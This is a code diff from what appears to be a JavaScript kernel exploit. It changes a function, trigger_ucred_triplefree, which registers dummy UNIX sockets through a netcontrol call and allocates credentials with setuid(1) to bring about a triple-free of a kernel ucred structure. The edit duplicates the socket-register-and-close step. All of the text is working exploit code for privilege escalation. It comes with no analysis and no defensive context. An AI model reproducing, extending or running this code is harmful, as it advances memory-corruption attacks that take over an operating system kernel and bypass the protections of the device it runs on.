@@ -1437,10 +1437,19 @@ function trigger_ucred_triplefree() {
     main_count++;
 
     // 1) dummy socket → register in netcontrol
-    var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
-    write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFF)));
+    var dummy_socketA = socket(AF_UNIX, SOCK_STREAM, 0);
+    write32(nc_set_buf, Number(dummy_socketA.and(0xFFFFFFFF)));
     netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
-    close(new BigInt(dummy_socket));
+    close(new BigInt(dummy_socketA));
+
+    // 2) allocate new ucred
+    setuid(1);
+
+    // 1) dummy socket → register in netcontrol
+    var dummy_socketB = socket(AF_UNIX, SOCK_STREAM, 0);
+    write32(nc_set_buf, Number(dummy_socketB.and(0xFFFFFFFF)));
+    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
+    close(new BigInt(dummy_socketB));
 
     // 2) allocate new ucred
     setuid(1);
